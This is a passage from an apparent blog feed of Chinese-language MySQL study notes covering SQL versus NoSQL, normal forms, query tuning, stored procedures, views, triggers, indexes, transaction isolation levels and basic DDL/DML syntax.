title="SQL与NOSQL"></a>SQL与NOSQL</h2><p>MySQL需要定义的结构化架构。<br>NoSQL允许“ 文档” 中任何数据的持久性。<br>MySQL有一个庞大的社区支持它。<br>NoSQL有一个小而快速增长的社区。<br>NoSQL具有易于扩展的特点。<br>MySQL需要更多托管可伸缩性。<br>MySQL利用SQL，它被用于多种数据库类型。<br>NoSQL是一个基于设计的数据库，具有流行的实现。<br>MySQL使用标准查询语言（SQL）。<br>NoSQL不使用标准查询语言。<br>MySQL有许多出色的报告工具。<br>NoSQL很少提供难以标准化的报告工具。<br>MySQL可以为大数据提供性能问题。<br>NoSQL在大数据方面表现出色。</p>]]></content>
      
      
      <categories>
          
          <category> NoSQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NoSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Database Design</title>
      <link href="/2019/03/15/Database-Design/"/>
      <url>/2019/03/15/Database-Design/</url>
      
        <content type="html"><![CDATA[<h4 id="第一范式（1NF）"><a href="#第一范式（1NF）" class="headerlink" title="第一范式（1NF）"></a>第一范式（1NF）</h4><p>原子性<br>即表的列的信息具有原子性，不可再分解。<br>只要数据库是关系型数据库，就自动满足1NF。</p><h4 id="第二范式（2NF）"><a href="#第二范式（2NF）" class="headerlink" title="第二范式（2NF）"></a>第二范式（2NF）</h4><p>满足第二范式必须先满足第一范式。<br>第二范式要求数据库表中的每个实例或行必须可以被唯一的区分。<br>通常我们通过设计主键来实现区分。</p><h4 id="第三范式（3NF）"><a href="#第三范式（3NF）" class="headerlink" title="第三范式（3NF）"></a>第三范式（3NF）</h4><p>满足第三范式必须先满足第二范式。<br>要求一个数据库表中不包含已在其他表中已包含的非主键字段。<br>为了满足第三范式往往会把一张表分成多张表。<br>范式不是绝对，可以违背，比如中间连接表，含有被连接表的主键uuid之类的。</p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> DataBase Design </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql Optimization</title>
      <link href="/2019/03/13/Mysql-Optimization/"/>
      <url>/2019/03/13/Mysql-Optimization/</url>
      
        <content type="html"><![CDATA[<h4 id="开启慢查询并分析"><a href="#开启慢查询并分析" class="headerlink" title="开启慢查询并分析"></a>开启慢查询并分析</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 打开慢语句日志记录</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%slow%'</span>; <span class="comment">-- 找到 slow_query_log</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log=<span class="keyword">on</span>; <span class="comment">-- 打开</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%long%'</span>; <span class="comment">-- 找到 long_query_time，单位为秒，默认10秒</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> long_query_time=<span class="number">1</span>; <span class="comment">--改小此值（你目标的查询速度）</span></span><br><span class="line"><span class="keyword">explain</span> 查询得很慢的那条语句;</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%profiling%'</span>;</span><br><span class="line"><span class="keyword">set</span> profiling=<span class="keyword">ON</span>;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">profiles</span>; <span class="comment">-- 就能看到所有之前执行语句的执行时间</span></span><br><span class="line"><span class="keyword">show</span> profile <span class="keyword">for</span> <span class="keyword">query</span> Query_ID; <span class="comment">-- 就能看到执行那条语句所有操作以及对应的时间；然后就能有针对的优化了</span></span><br></pre></td></tr></table></figure><h4 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 找到缓存</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> ‘%<span class="keyword">cache</span>%’; <span class="comment">-- 找到 query_cache_size 和 query_cache_type</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> query_cache_size = <span class="number">1024000</span>; <span class="comment">-- 然后给size附一定的值</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> Optimization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Additional SQL</title>
      <link href="/2019/03/09/Additional-SQL/"/>
      <url>/2019/03/09/Additional-SQL/</url>
      
        <content type="html"><![CDATA[<h4 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h4><blockquote><p>存储过程是用户定义的一系列sql语句的集合，涉及特定表或其它对象的任务，用户可以调用存储过程，而函数通常是数据库已定义的方法，它接收参数并返回某种类型的值并且不涉及特定用户表。</p></blockquote><h5 id="存储过程和函数的区别"><a href="#存储过程和函数的区别" class="headerlink" title="存储过程和函数的区别"></a>存储过程和函数的区别</h5><ol><li>一般来说，存储过程实现的功能要复杂一点，而函数的实现的功能针对性比较强。存储过程，功能强大，可以执行包括修改表等一系列数据库操作；用户定义函数不能用于执行一组修改全局数据库状态的操作。</li><li>对于存储过程来说可以返回参数，如记录集，而函数只能返回值或者表对象。函数只能返回一个变量；而存储过程可以返回多个。存储过程的参数可以有IN,OUT,INOUT三种类型，而函数只能有IN类~~存储过程声明时不需要返回类型，而函数声明时需要描述返回类型，且函数体中必须包含一个有效的RETURN语句。</li><li>存储过程，可以使用非确定函数，不允许在用户定义函数主体中内置非确定函数。</li><li>存储过程一般是作为一个独立的部分来执行（ EXECUTE 语句执行），而函数可以作为查询语句的一个部分来调用（SELECT调用），由于函数可以返回一个表对象，因此它可以在查询语句中位于FROM关键字的后面。 SQL语句中不可用存储过程，而可以使用函数。<h5 id="编写存储过程"><a href="#编写存储过程" class="headerlink" title="编写存储过程"></a>编写存储过程</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 存储过程函数</span></span><br><span class="line">delimiter // <span class="comment">-- 修改结束符，避免冲突</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> he(a <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">id</span>=a;</span><br><span class="line"><span class="keyword">end</span>//</span><br><span class="line"></span><br><span class="line">delimiter ;</span><br><span class="line"><span class="keyword">call</span> he(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="视图VIEW"><a href="#视图VIEW" class="headerlink" title="视图VIEW"></a>视图VIEW</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 视图其实就是当作一个查询表来使用</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">view</span> 视图名(字段名<span class="number">1</span>，字段名<span class="number">2</span>，....) <span class="keyword">as</span> <span class="keyword">select</span> 语句;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">view</span> 视图名(字段名<span class="number">1</span>，字段名<span class="number">2</span>，....) <span class="keyword">as</span> <span class="keyword">select</span> 语句;</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 视图名;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">view</span> (<span class="keyword">if</span> <span class="keyword">exists</span>) 视图名;</span><br></pre></td></tr></table></figure><h4 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h4><blockquote><p>在对某个表进行操作之前/之后，进行另一个操作</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delimiter //</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> 触发器名 <span class="keyword">after</span>/<span class="keyword">before</span> <span class="keyword">insert</span>/<span class="keyword">update</span>/<span class="keyword">delete</span> <span class="keyword">on</span> 表名 <span class="keyword">for</span> <span class="keyword">each</span> <span class="keyword">row</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">sql</span>语句;</span><br><span class="line"><span class="keyword">end</span>//</span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure><h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><blockquote><p>索引在提供查找速度的同时，会降低增删改的速度</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 唯一索引：不可以出现相同的值，可以有NULL值</span></span><br><span class="line">UNIQUE</span><br><span class="line"><span class="comment">-- 普通索引：允许出现相同的索引内容；</span></span><br><span class="line">INDEX</span><br><span class="line"><span class="comment">-- 主键索引：不允许出现相同的值</span></span><br><span class="line">PROMARY KEY</span><br><span class="line"><span class="comment">-- 全文索引：可以针对值中的某个单词，但效率很低</span></span><br><span class="line">fulltext</span><br><span class="line"><span class="comment">-- 组合索引：实质上是将多个字段建到一个索引里，列值的组合必须唯一</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 添加索引</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span> <span class="keyword">index</span>/<span class="keyword">unique</span>/fulltext/primary <span class="keyword">key</span> [索引名] (字段名);</span><br><span class="line"><span class="comment">-- 删除索引</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> <span class="keyword">index</span> 索引名;</span><br><span class="line">查看表的所有索引</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">index</span> <span class="keyword">from</span> 表名;</span><br><span class="line"><span class="comment">-- Table: 表的名称</span></span><br><span class="line"><span class="comment">-- Non_unique: 如果索引不能包括重复词，则为0。如果可以，则为1</span></span><br><span class="line"><span class="comment">-- Key_name: 索引的名称</span></span><br><span class="line"><span class="comment">-- Seq_in_index: 索引中的列序列号，从1开始。</span></span><br><span class="line"><span class="comment">-- Column_name: 字段名称</span></span><br><span class="line"><span class="comment">-- Collation: 列以什么方式存储在索引中。在MySQL中，有值‘A’（升序）或NULL（无分类）。</span></span><br><span class="line"><span class="comment">-- Cardinality: 索引中唯一值的数目的估计值。通过运行ANALYZE TABLE或myisamchk -a可以更新。基数根据被存储为整数的统计数据来计数，所以即使对于小型表，该值也没有必要是精确的。基数越大，当进行联合时，MySQL使用该索引的机 会就越大。</span></span><br><span class="line"><span class="comment">-- Sub_part: 如果列只是被部分地编入索引，则为被编入索引的字符的数目。如果整列被编入索引，则为NULL。</span></span><br><span class="line"><span class="comment">-- Packed: 指示关键字如何被压缩。如果没有被压缩，则为NULL。</span></span><br><span class="line"><span class="comment">-- Null: 如果列含有NULL，则含有YES。如果没有，则该列含有NO。</span></span><br><span class="line"><span class="comment">-- Index_type: 用过的索引方法（BTREE, FULLTEXT, HASH, RTREE）。</span></span><br><span class="line"><span class="comment">-- Comment</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 全文索引下模糊查询</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> 表名 <span class="keyword">where</span> <span class="keyword">match</span>(字段名) against(查询值);</span><br><span class="line"><span class="comment">-- 组合索引</span></span><br><span class="line">index(字段名1,字段名2,....);</span><br><span class="line"><span class="comment">-- 外键约束</span></span><br><span class="line">foreign key(字段名) references 表名(字段名);</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> index </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Transaction ACID</title>
      <link href="/2019/03/07/Transaction-ACID/"/>
      <url>/2019/03/07/Transaction-ACID/</url>
      
        <content type="html"><![CDATA[<h4 id="事务ACID"><a href="#事务ACID" class="headerlink" title="事务ACID"></a>事务ACID</h4><blockquote><p>一个sql语句就是一个事务<br>事务可以保证一组sql语句要么都成功，要么都失败，默认自动提交<br><a href="https://zhuanlan.zhihu.com/p/29166694" target="_blank" rel="noopener">知乎事务详述</a></p></blockquote><h5 id="事务的特性"><a href="#事务的特性" class="headerlink" title="事务的特性"></a>事务的特性</h5><ul><li>原子性 Atomicity：一个事务必须被视为一个不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚，对于一个事务来说，不可能只执行其中的一部分操作。</li><li>一致性 Consistency：数据库总是从一个一致性状态转换到另一个一致状态。让数据保持逻辑上的‘合理性’。</li><li>隔离性 Isolation：通常来说，一个事务所做的修改在最终提交以前，对其他事务是不可见的。在事务A提交之前，事务B观察不到数据的改变。</li><li>持久性 Durability：一个事务执行成功，则对数据来说应该是一个明确的硬盘数据变更（而不仅仅是内存中的变化）。此时即使系统崩溃，修改的数据也不会丢失。</li><li>事务的隔离性是通过锁，MVCC等实现；原子性、一致性、持久性是通过事务日志实现<h5 id="并发事务带来的问题"><a href="#并发事务带来的问题" class="headerlink" title="并发事务带来的问题"></a>并发事务带来的问题</h5><h6 id="脏读-Dirty-read"><a href="#脏读-Dirty-read" class="headerlink" title="脏读 Dirty read"></a>脏读 Dirty read</h6>当一个事务正在访问数据并且对数据进行了修改，而这种修改还没有提交到数据库中，这时另外一个事务也访问了这个数据，然后使用了这个数据。因为这个数据是还没有提交的数据，那么另外一个事务读到的这个数据是“脏数据”，依据“脏数据”所做的操作可能是不正确的。<h6 id="丢失修改-Lost-to-modify"><a href="#丢失修改-Lost-to-modify" class="headerlink" title="丢失修改 Lost to modify"></a>丢失修改 Lost to modify</h6>指在一个事务读取一个数据时，另外一个事务也访问了该数据，那么在第一个事务中修改了这个数据后，第二个事务也修改了这个数据。这样第一个事务内的修改结果就被丢失，因此称为丢失修改。例如：事务1读取某表中的数据A=20，事务2也读取A=20，事务1修改A=A-1，事务2也修改A=A-1，最终结果A=19，事务1的修改被丢失。<h6 id="不可重复读-Unrepeatableread"><a href="#不可重复读-Unrepeatableread" class="headerlink" title="不可重复读 Unrepeatableread"></a>不可重复读 Unrepeatableread</h6>指在一个事务内多次读同一数据。在这个事务还没有结束时，另一个事务也访问该数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改导致第一个事务两次读取的数据可能不太一样。这就发生了在一个事务内两次读到的数据是不一样的情况，因此称为不可重复读。<h6 id="幻读-Phantom-read"><a href="#幻读-Phantom-read" class="headerlink" title="幻读 Phantom read"></a>幻读 Phantom read</h6>幻读与不可重复读类似。它发生在一个事务（T1）读取了几行数据，接着另一个并发事务（T2）插入了一些数据时。在随后的查询中，第一个事务（T1）就会发现多了一些原本不存在的记录，就好像发生了幻觉一样，所以称为幻读。<h6 id="不可重复度和幻读区别"><a href="#不可重复度和幻读区别" class="headerlink" title="不可重复度和幻读区别"></a>不可重复度和幻读区别</h6>不可重复读的重点是修改，幻读的重点在于新增或者删除。<h5 id="事务隔离级别"><a href="#事务隔离级别" class="headerlink" title="事务隔离级别"></a>事务隔离级别</h5><h6 id="读取未提交-READ-UNCOMMITTED"><a href="#读取未提交-READ-UNCOMMITTED" class="headerlink" title="读取未提交 READ-UNCOMMITTED"></a>读取未提交 READ-UNCOMMITTED</h6>最低的隔离级别，允许读取尚未提交的数据变更，可能会导致脏读、幻读或不可重复读。<h6 id="读取已提交-READ-COMMITTED"><a href="#读取已提交-READ-COMMITTED" class="headerlink" title="读取已提交 READ-COMMITTED"></a>读取已提交 READ-COMMITTED</h6>允许读取并发事务已经提交的数据，可以阻止脏读，但是幻读或不可重复读仍有可能发生。<h6 id="可重复读-REPEATABLE-READ"><a href="#可重复读-REPEATABLE-READ" class="headerlink" title="可重复读 REPEATABLE-READ"></a>可重复读 REPEATABLE-READ</h6>对同一字段的多次读取结果都是一致的，除非数据是被本身事务自己所修改，可以阻止脏读和不可重复读，但幻读仍有可能发生。<h6 id="可串行化-SERIALIZABLE"><a href="#可串行化-SERIALIZABLE" class="headerlink" title="可串行化 SERIALIZABLE"></a>可串行化 SERIALIZABLE</h6>最高的隔离级别，完全服从ACID的隔离级别。所有的事务依次逐个执行，这样事务之间就完全不可能产生干扰，也就是说，该级别可以防止脏读、不可重复读以及幻读。<h6 id="MySQL默认隔离级别"><a href="#MySQL默认隔离级别" class="headerlink" title="MySQL默认隔离级别"></a>MySQL默认隔离级别</h6>InnoDB 存储引擎的默认支持的隔离级别是 REPEATABLE-READ（可重读）。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @@tx_isolation;</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">| @@tx_isolation  |</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">| REPEATABLE-READ |</span><br><span class="line">+<span class="comment">-----------------+</span></span><br></pre></td></tr></table></figure>与 SQL 标准不同的地方在于InnoDB 存储引擎在 REPEATABLE-READ（可重读）事务隔离级别下使用的是Next-Key Lock 锁算法，因此可以避免幻读的产生，这与其他数据库系统(如 SQL Server)是不同的。所以说InnoDB 存储引擎的默认支持的隔离级别是 REPEATABLE-READ（可重读） 已经可以完全保证事务的隔离性要求，即达到了 SQL标准的SERIALIZABLE(可串行化)隔离级别。</li></ul><p>因为隔离级别越低，事务请求的锁越少，所以大部分数据库系统的隔离级别都是READ-COMMITTED(读取提交内容)，但是InnoDB 存储引擎默认使用 REPEATABLE-READ（可重读）并不会有任何性能损失。</p><p>InnoDB 存储引擎在 分布式事务 的情况下一般会用到SERIALIZABLE(可串行化)隔离级别。</p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> transaction </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL</title>
      <link href="/2019/03/06/SQL/"/>
      <url>/2019/03/06/SQL/</url>
      
        <content type="html"><![CDATA[<blockquote><p>SQL——Structured Query Language 结构化查询语言</p></blockquote><h4 id="书写规则"><a href="#书写规则" class="headerlink" title="书写规则"></a>书写规则</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 分号结尾</span><br><span class="line">2. 关键词不区分大小写</span><br><span class="line">3. % 任意字符</span><br><span class="line">4. _ 单个字符</span><br></pre></td></tr></table></figure><h4 id="注释方法"><a href="#注释方法" class="headerlink" title="注释方法"></a>注释方法</h4><h5 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注释内容</span></span><br><span class="line"><span class="comment">-- 注释内容，注意有空格</span></span><br></pre></td></tr></table></figure><h5 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*注释*/</span></span><br></pre></td></tr></table></figure><h4 id="字段类型-修饰"><a href="#字段类型-修饰" class="headerlink" title="字段类型/修饰"></a>字段类型/修饰</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unsigned：无符号</span><br><span class="line">auto_increment：自增</span><br><span class="line">default：默认值</span><br><span class="line"><span class="keyword">comment</span>：对字段解释说明</span><br><span class="line"><span class="literal">null</span>：空</span><br><span class="line"><span class="keyword">not</span> <span class="literal">null</span>：非空</span><br><span class="line"><span class="keyword">unique</span>：唯一索引</span><br><span class="line"><span class="keyword">index</span>：普通索引</span><br><span class="line">primary <span class="keyword">key</span>：主键</span><br><span class="line">auto_increment必须指定为primary <span class="keyword">key</span></span><br><span class="line">zerofill：位数不足的地方补零</span><br></pre></td></tr></table></figure><h4 id="语句运算符"><a href="#语句运算符" class="headerlink" title="语句运算符"></a>语句运算符</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">= ：赋值和判断都是，没有 ==</span><br><span class="line">!=、&lt;&gt;、&lt;、&gt;、&lt;=、&gt;=</span><br><span class="line">OR：或者</span><br><span class="line">AND：且</span><br><span class="line">BETWEEN...AND：在...和...之间（范围）</span><br><span class="line">IN：eg.in(1,2,3,4)给定具体范围</span><br><span class="line">NOT IN</span><br></pre></td></tr></table></figure><h4 id="SQL语句的分类"><a href="#SQL语句的分类" class="headerlink" title="SQL语句的分类"></a>SQL语句的分类</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、DDL（data defination language）数据定义语言，作用：创建 删除 修改 库表结构</span><br><span class="line">2、DML（data manipulation language）数据操作语言，作用：增 删 改表的记录</span><br><span class="line">3、DCL（data control language）数据控制语言，作用：用户的创建以及授权</span><br><span class="line">4、DQL（data query language）数据查询语言，作用：查询数据</span><br></pre></td></tr></table></figure><h5 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看数据库</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">DATABASES</span>;</span><br><span class="line"><span class="comment">-- 切换数据库</span></span><br><span class="line"><span class="keyword">USE</span> 数据库名;</span><br><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> 数据库名;</span><br><span class="line"><span class="comment">-- 删除数据库</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> 数据库名;</span><br><span class="line"><span class="comment">-- 查看数据库版本，字符编码等信息</span></span><br><span class="line">\s</span><br><span class="line"><span class="comment">-- 查看数据库所用什么字符型式</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%char%'</span>;</span><br><span class="line"><span class="comment">-- 解决显示乱码问题</span></span><br><span class="line">修改 my.ini 配置文件中 default-character-<span class="keyword">set</span>=gbk;</span><br><span class="line"><span class="comment">-- 数据库导出数据</span></span><br><span class="line">mysqldump -uroot -p密码 数据库名称 表名称 &gt;表名称.sql</span><br><span class="line"><span class="comment">-- 修改结束符</span></span><br><span class="line">delimiter 自定义的结束符;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建数据表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名(</span><br><span class="line">    字段名 字段类型 其他关键词,</span><br><span class="line">    ...</span><br><span class="line">)</span><br><span class="line"><span class="comment">-- 查看当前数据库的表</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">TABLES</span>;</span><br><span class="line"><span class="comment">-- 查看表结构</span></span><br><span class="line">DESC 表名;</span><br><span class="line"><span class="comment">-- 查看创建表的SQL语句</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> TABEL 表名;</span><br><span class="line"><span class="comment">-- 删除表，但有外键关联的时候不能直接删除主表</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> 表名;</span><br><span class="line"><span class="comment">-- 添加表字段</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> (字段名 字段类型, 字段名 字段类型, ...); <span class="comment">-- 默认添加到所有字段之后</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> 字段名<span class="number">1</span> 字段类型 <span class="keyword">AFTER</span>/<span class="keyword">FIRST</span> 字段名<span class="number">2</span>; <span class="comment">-- 将字段名1添加到字段名2之后/放在表头</span></span><br><span class="line"><span class="comment">-- 删除表字段</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> 字段名;</span><br><span class="line"><span class="comment">-- 修改表字段类型</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">MODIFY</span> 字段名 字段类型; <span class="comment">-- 别忘了not null</span></span><br><span class="line"><span class="comment">-- 修改表字段名</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">CHANGE</span> 原字段名 新字段名 字段类型;</span><br><span class="line"><span class="comment">-- 修改表名</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">RENAME</span> (<span class="keyword">TO</span>) 新表名;</span><br><span class="line"><span class="comment">-- 外键关联主键，fk为约束名</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tbl_book(</span><br><span class="line">  <span class="keyword">id</span> <span class="built_in">INT</span> PRIMARY <span class="keyword">KEY</span> AUTO_INCREMENT,</span><br><span class="line">  bookTypeId <span class="built_in">INT</span>,</span><br><span class="line">  <span class="keyword">CONSTRAINT</span> <span class="string">`fk`</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (<span class="string">`bookTypeId`</span>) <span class="keyword">REFERENCES</span> <span class="string">`tbl_bookType`</span>(<span class="string">`id`</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h5 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看表内容</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> 表名;</span><br><span class="line"><span class="comment">-- 插入字段值</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名(列<span class="number">1</span>, 列<span class="number">2</span>, 列<span class="number">3.</span>..) <span class="keyword">VALUES</span>(列值<span class="number">1</span>, 列值<span class="number">2.</span>....); <span class="comment">-- 列和值是一一对应的</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 <span class="keyword">values</span>(值<span class="number">1</span>, 值<span class="number">2</span>,...,值n); <span class="comment">-- 